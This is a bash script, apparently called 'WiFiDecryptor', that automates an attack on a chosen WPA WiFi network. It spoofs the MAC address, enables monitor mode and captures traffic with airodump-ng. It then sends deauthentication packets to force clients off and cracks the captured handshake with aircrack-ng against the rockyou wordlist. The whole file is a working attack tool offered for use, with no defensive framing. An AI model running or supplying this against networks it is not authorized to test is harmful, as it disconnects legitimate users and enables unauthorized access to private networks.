#!/bin/bash

#Created by 666aalexx

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	clear
	sleep 0.5
	echo -e "${grayColour}Exiting...${endColour}"
	airmon-ng stop $card
	rm audit* > /dev/null 2>&1
	rm network* > /dev/null 2>&1
	exit 0
}

function dependencies(){
	clear
	echo -e "${grayColour}Checking dependencies...${endColour}"
	sleep 1.2
	dependencies=(aircrack-ng macchanger)
	for program in "${dependencies[@]}"; do
	test -f /usr/bin/$program > /dev/null 2>&1
	if [ $? == "0" ]; then
	echo -e "${greenColour}[✓] $program${endColour}"
	sleep 0.5
	else
	echo -e "${redColour}[!] $program${endColour}"
	echo -e "${grayColour}Installing $program...${endColour}"
	apt install $program -y > /dev/null 2>&1
	sleep 0.5
	fi
done
}

function checkmonprefix(){
    iwconfig "$card" | grep -q "${card}mon" > /dev/null 2>&1
    if [ $? == "0" ]; then
        card="${card}mon"
    fi
}

function start(){
	clear
	echo -e "${redColour}"
echo "  _      ___ _____ ___                        __          "
echo " | | /| / (_) __(_) _ \___ __________ _____  / /____  ____"
echo " | |/ |/ / / _// / // / -_) __/ __/ // / _ \/ __/ _ \/ __/"
echo " |__/|__/_/_/ /_/____/\__/\__/_/  \_, / .__/\__/\___/_/   "
echo "                                 /___/_/                  "
	echo -e "${endColour}"
	echo -e "${grayColour}by 666aalexx${endColour}\n"

	card=$(iwconfig 2>/dev/null | grep -o "wl.*" | awk '{print $1}')

	if [ -z $card ]; then
	clear
	echo -e "${redColour}No network card found${endColour}"
	sleep 1.5
	start
	fi

	echo -e "\n${grayColour}WIFI:${endColour}"
	read -p ">" WIFI
}

function attack(){
	clear
	echo -e "${grayColour}Starting attack...${endColour}"
	sleep 1

	ifconfig $card down
	echo -e "\n${grayColour}MAC changed to $(macchanger -s $card | awk '{print $3}' | head -1)${endColour}"
	sleep 1
	ifconfig $card up > /dev/null 2>&1
	airmon-ng check kill $card > /dev/null 2>&1
	airmon-ng start $card > /dev/null 2>&1
	checkmonprefix

	clear
	echo -e "${grayColour}Checking networks...${endColour}"
	airodump-ng $card -w networks > /dev/null 2>&1 &
	PID=$!
	sleep 12
	kill $PID

	BSSID=$(grep "$WIFI" networks-01.csv | awk '{print $1}' | sed 's/,$//')
	CH=$(grep "$WIFI" networks-01.csv | awk '{print $6}' | sed 's/,$//')

	if [ -z $BSSID ]; then
	clear
	echo -e "${redColour}Network card error${endColour}"
	sleep 1.5
	echo -e "${redColour}No networks found${endColour}"
	sleep 1.5
	clear
	echo -e "${grayColour}Retrying...${endColour}"
	sleep 0.7
	start
	fi

	clear
	echo -e "${grayColour}Checking stations...${endColour}"
	while true; do
	airodump-ng -c $CH --bssid $BSSID -w network $card > /dev/null 2>&1 &
	sleep 20
	STATION=$(awk -F ', ' '/Station MAC/ {getline; print $1}' network-01.csv)
	HANDSHAKE=$(strings network-01.cap | grep "EAPOL")
	clear
	echo -e "${grayColour}Capturing Handshake...${endColour}"
	sleep 1.5
	if [ -n $HANDSHAKE ]; then
	echo -e "${greenColour}[*] Handshake found${endColour}"
	sleep 1.5
	break
	fi
	done

	clear
	echo -e "${grayColour}Sending deauthentication packets...${endColour}"
	sleep 2
	aireplay-ng -0 9 -a $BSSID -c $STATION $card

	clear
	echo -e "${grayColour}Checking dictionary...${endColour}"
	sleep 2
	test -f /usr/share/wordlists/rockyou.txt
	if [ $? == "0" ]; then
	echo -e "${greenColour}[V] Rockyou.txt${endColour}"
	sleep 0.5
	else
	echo -e "${redColour}[X] Rockyou.txt${endColour}"
	sleep 0.5
	echo -e "${grayColour}Decompressing dictionary${endColour}"
	sleep 0.5
	7z x /usr/share/wordlists/rockyou.gz
	fi

	echo -e "${grayColour}Cracking password...${endColour}"
	sleep 0.5
	clear
	aircrack-ng -b $BSSID -w /usr/share/wordlists/rockyou.txt network-01.cap
}

start
dependencies
attack
rm network* > /dev/null 2>&1
